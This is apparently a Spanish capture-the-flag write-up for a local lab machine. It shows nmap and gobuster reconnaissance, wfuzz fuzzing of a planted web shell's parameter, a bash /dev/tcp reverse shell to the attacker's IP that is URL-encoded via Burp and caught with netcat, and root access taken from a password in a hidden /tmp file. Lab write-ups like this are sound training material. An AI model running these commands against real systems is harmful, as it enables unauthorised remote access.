![Image](https://github.com/user-attachments/assets/e1c96b3b-f13e-4bb9-880a-67c0b8c22f0e)



```bash
sudo nmap -p- --open -sS --min-rate 5000 -sVC -vvv -n -Pn 172.17.0.2
```
![Image](https://github.com/user-attachments/assets/1ca35a55-33f1-40e9-b376-6421d9d15564)


Vemos la web por el puerto 80

![Image](https://github.com/user-attachments/assets/d674e21d-2024-4235-a924-3ba603ddc9ad)


---

![Image](https://github.com/user-attachments/assets/ceca3495-8c1d-48b0-b4e9-9c51bbf115dc)

Con gobuster vemos dos archivos interesantes, uno llamado **/warning.html** y otro llamado **/shell.php.**

En **/warning.html** encontramos esto y ya tenemos una pista mas

![Image](https://github.com/user-attachments/assets/7cee2b4e-5b7a-433f-9d6b-23083868f372)


Vamos a usar wfuzz para encontrar ese parámetro, colocamos el siguiente comando:

```bash
wfuzz -c --hl=0 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
```

### Parámetros:

- `wfuzz`: Herramienta para fuzzing web (probar entradas para descubrir recursos o vulnerabilidades).
    
- `-c`: Colores en la salida, para hacerla más legible.
    
- `--hl=0`: Oculta (hide lines) las respuestas con **longitud 0**. Útil para ignorar respuestas vacías.
    
- `-t 200`: Usa **200 hilos** (threads) para hacer el fuzzing más rápido (paraleliza las peticiones).
    
- `-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: Wordlist usada. En este caso, una lista de palabras para probar en la URL. Esta lista es buena para descubrir directorios y parámetros comunes.
    
- `-u "http://172.17.0.2/shell.php?FUZZ=id"`: URL objetivo. La palabra `FUZZ` será reemplazada por cada palabra de la wordlist. Aquí se está buscando un **parámetro válido** en `shell.php` (ej: `cmd=id`, `exec=id`, etc.).
    
### ¿Por qué se usa?

Este comando intenta descubrir qué parámetro acepta `shell.php` para ejecutar comandos (`id` en este caso). Es útil para identificar entradas vulnerables en archivos que ejecutan código, como shells web.

---
Encontramos el parámetro:

![Image](https://github.com/user-attachments/assets/78398d70-f400-4dfe-a2ce-926102eac3e2)


Vemos que funciona:
![Image](https://github.com/user-attachments/assets/66163751-2d56-496d-bea2-6ff9349f2de3)

Ahora vamos hacer una `Revershell` 
![Image](https://github.com/user-attachments/assets/3043ee64-8e59-42ae-9f59-091dbc849b29)


Ponemos nuestra IP, el puerto que vamos a ponernos en escucha y copiamos ese comando que seria este:

```bash
bash -i >& /dev/tcp/172.17.0.1/443 0>&1 
```

Pero para que funcione mejor hacemos esto:

```bash 
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

Aquí lo que hicimos fue que pusimos al principio *bash -c* y pusimos todo el comando siguiente entre *comillas*.

Ahora que lo tenemos así vamos usar *burp* con **Decoder** este nos va generar una URL para ponerlo en el navegador y lo pueda interpretar mejor de esta manera:
![Image](https://github.com/user-attachments/assets/d38790dd-4f56-427d-a3f1-c805d3bda27d)


Copiamos ahora el nuevo comando en formato URL y vamos hacer nuestra revershell.

![Image](https://github.com/user-attachments/assets/8a8fde97-b4ae-46c9-9284-ae60bbda0b64)


Nos ponemos en escucha por el puerto 443...

```bash
sudo nc nlvp 443
```

y listo, estamos dentro:

![Image](https://github.com/user-attachments/assets/a7e94252-1f9e-47fa-a6d7-da2d807baee2)


Hacemos tratamiento de la TTY y continuamos para volvernos root.

---
Ya dentro nos movemos a **cd /home** y recordamos que en la pagina nos decía que había un secreto en **/tmp** así que nos movemos ahí. usamos el siguiente comando para ver *archivos ocultos*

```bash 
ls -la
```

Ejemplo del movimiento:
```bash 
www-data@54ef636fe430:/$ cd home
www-data@54ef636fe430:/home$ cd /tmp
www-data@54ef636fe430:/tmp$ ls -la
total 12
drwxrwxrwt 1 root root 4096 May 21 19:18 .
drwxr-xr-x 1 root root 4096 May 21 19:18 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
www-data@54ef636fe430:/tmp$ cat .secret.txt
contraseñaderoot123
www-data@54ef636fe430:/tmp$ 
```

Ahi vemos la contraseña para root al parecer, la vamos a probar.
![Image](https://github.com/user-attachments/assets/e4121bcf-0270-417d-981c-6a8a827ef818)

Listo, somos root.
